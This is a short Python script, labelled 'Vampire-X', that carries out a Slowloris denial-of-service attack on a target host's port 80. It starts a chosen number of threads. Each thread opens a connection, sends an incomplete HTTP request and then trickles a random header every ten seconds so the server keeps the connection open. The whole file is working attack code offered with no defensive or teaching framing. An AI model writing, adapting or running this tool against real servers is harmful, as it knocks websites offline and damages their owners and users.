#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket as s, threading as t, random as r, time as T

def A(x, y):
    print(f"\n[Slowloris] Vampire-X Slowloris Attack started on {x} with {y} threads\n")

    def B():
        try:
            c = s.socket(s.AF_INET, s.SOCK_STREAM)
            c.connect((x, 80))
            c.send(f"GET / HTTP/1.1\r\nHost: {x}\r\n".encode())
            while True:
                try:
                    h = f"X-a: {r.randint(1,5000)}\r\n"
                    c.send(h.encode())
                    print(f"[Slowloris] Header sent to {x}")
                    T.sleep(10)
                except:
                    break
            c.close()
        except Exception as e:
            print(f"[Slowloris] Error: {str(e)}")

    for _ in range(y):
        z = t.Thread(target=B); z.daemon = True; z.start()
